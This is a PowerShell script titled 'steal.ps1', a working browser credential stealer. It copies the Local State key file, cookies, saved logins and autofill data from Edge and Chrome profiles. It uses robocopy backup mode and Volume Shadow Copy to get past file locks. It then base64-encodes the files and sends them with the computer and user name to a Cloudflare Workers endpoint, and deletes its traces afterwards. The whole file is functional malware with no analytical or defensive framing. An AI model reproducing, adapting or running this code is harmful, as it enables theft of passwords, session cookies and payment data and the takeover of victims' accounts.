# steal.ps1
# Forces Volume Shadow Copy to read locked Edge/Chrome files.

$worker_url = "https://reciever.tyceno89.workers.dev"
$temp = "$env:TEMP\steal_all"
New-Item -ItemType Directory -Force -Path $temp | Out-Null

# --- 1) Browser paths ---
$browsers = @(
    @{
        Name = "Edge"
        LocalState = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
        Cookies = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
        LoginData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
        WebData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"
    },
    @{
        Name = "Chrome"
        LocalState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
        Cookies = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
        LoginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        WebData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
    }
)

# --- 2) Force Volume Shadow Copy (VSS) to copy locked files ---
function Copy-LockedFile {
    param($src, $dst)
    # Try normal copy first
    try { Copy-Item $src $dst -Force -ErrorAction Stop; return $true } catch {}
    # Try robocopy backup mode
    try {
        $src_dir = Split-Path $src
        $src_file = Split-Path $src -Leaf
        $dst_dir = Split-Path $dst
        robocopy $src_dir $dst_dir $src_file /B /R:1 /W:1 /NFL /NDL /NJH /NJS | Out-Null
        if (Test-Path $dst) { return $true }
    } catch {}
    # Fallback: use Volume Shadow Copy via wmic (works on Windows 10/11)
    try {
        $shadow = wmic shadowcopy call create Volume='C:\' | Select-String "ShadowID"
        if ($shadow) {
            $shadow_id = $shadow -replace '.*\{|\}.*',''
            $shadow_path = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$shadow_id\"
            $src_shadow = $src -replace '^C:\\', $shadow_path
            Copy-Item $src_shadow $dst -Force -ErrorAction Stop
            wmic shadowcopy delete id={$shadow_id} | Out-Null
            return $true
        }
    } catch {}
    return $false
}

# --- 3) Collect files ---
$files_to_send = @()

foreach ($b in $browsers) {
    if (Test-Path $b.LocalState) {
        $dst = "$temp\$($b.Name)_LocalState.json"
        if (Copy-LockedFile $b.LocalState $dst) {
            $files_to_send += @{ name = "$($b.Name)_LocalState.json"; path = $dst }
        }
    }
    if (Test-Path $b.Cookies) {
        $dst = "$temp\$($b.Name)_Cookies.db"
        if (Copy-LockedFile $b.Cookies $dst) {
            $files_to_send += @{ name = "$($b.Name)_Cookies.db"; path = $dst }
        }
    }
    if (Test-Path $b.LoginData) {
        $dst = "$temp\$($b.Name)_LoginData.db"
        if (Copy-LockedFile $b.LoginData $dst) {
            $files_to_send += @{ name = "$($b.Name)_LoginData.db"; path = $dst }
        }
    }
    if (Test-Path $b.WebData) {
        $dst = "$temp\$($b.Name)_WebData.db"
        if (Copy-LockedFile $b.WebData $dst) {
            $files_to_send += @{ name = "$($b.Name)_WebData.db"; path = $dst }
        }
    }
}

# --- 4) Send to worker ---
$payload = @{
    pc = $env:COMPUTERNAME
    user = $env:USERNAME
    files = @{}
}

foreach ($f in $files_to_send) {
    $bytes = [IO.File]::ReadAllBytes($f.path)
    $b64 = [Convert]::ToBase64String($bytes)
    $payload.files[$f.name] = $b64
    Remove-Item $f.path -Force -ErrorAction SilentlyContinue
}

$json = $payload | ConvertTo-Json -Depth 10
Invoke-RestMethod -Uri $worker_url -Method Post -Body $json -ContentType "application/json"

Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
